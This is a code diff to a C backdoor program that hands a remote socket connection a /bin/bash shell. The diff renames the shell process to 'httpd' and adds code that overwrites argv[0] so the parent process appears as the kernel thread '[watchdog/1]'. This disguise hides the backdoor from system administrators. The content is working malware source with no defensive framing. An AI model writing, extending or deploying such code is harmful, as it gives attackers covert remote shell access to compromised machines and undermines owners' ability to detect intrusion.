@@ -17,7 +17,8 @@
 /* You should change these */
 #define MAGIC1		0x2a
 #define MAGIC2		0x7e
-#define PROGNAME	"httpd"
+#define SHELLNAME	"httpd"
+#define PARENTNAME      "[watchdog/1]"
 #define SHELL		"/bin/bash"
 
 
@@ -32,6 +33,11 @@ int main(int argc, char *argv[]) {
   unsigned short	port;
   struct sockaddr_in	shell;
 
+
+  if (strlen(argv[0]) >= strlen(PARENTNAME)) {
+    memset(argv[0], '\0', strlen(argv[0]));
+    strcpy(argv[0], PARENTNAME);
+  }
 
   /* Reap child processes */
   signal(SIGCHLD, SIG_IGN);
@@ -75,7 +81,7 @@ int main(int argc, char *argv[]) {
 	dup2(c, STDOUT_FILENO);
 	dup2(c, STDIN_FILENO);
 
-	execl(SHELL, PROGNAME, NULL);
+	execl(SHELL, SHELLNAME, NULL);
       }
     }
   }
